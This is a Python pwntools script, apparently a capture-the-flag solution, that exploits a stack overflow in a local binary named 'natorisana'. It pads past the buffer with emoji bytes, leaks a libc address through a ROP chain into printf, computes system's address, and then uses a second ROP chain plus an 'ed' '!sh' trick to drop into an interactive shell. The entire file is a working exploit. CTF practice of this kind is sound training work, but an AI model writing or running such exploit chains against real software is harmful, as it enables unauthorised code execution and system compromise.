

from pwn import *

p = process('./natorisana')

printf_plt = 0x402030
pop_rdi = 0x0000000000402a19
printf_got = 0x455928
main = 0x403f10
ret = 0x000000000040201a

# payload = "asd"
payload = ("ğŸ˜­"*70).encode('utf-8') + p64(ret) + p64(pop_rdi) + p64(printf_got) + p64(printf_plt) + p64(ret) + p64(main)
p.sendlineafter("text:", payload)
libc_leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(libc_leak))
libc_base = libc_leak - 0x60770
system = libc_base + 0x50d60
ed = 0x443c7b
print(hex(system))
payload = ("ğŸ˜­"*70).encode('utf-8') + p64(pop_rdi) + p64(ed) + p64(ret) + p64(system)
p.sendlineafter("text:", payload)
p.sendlineafter("inputted:", "!sh")

p.interactive()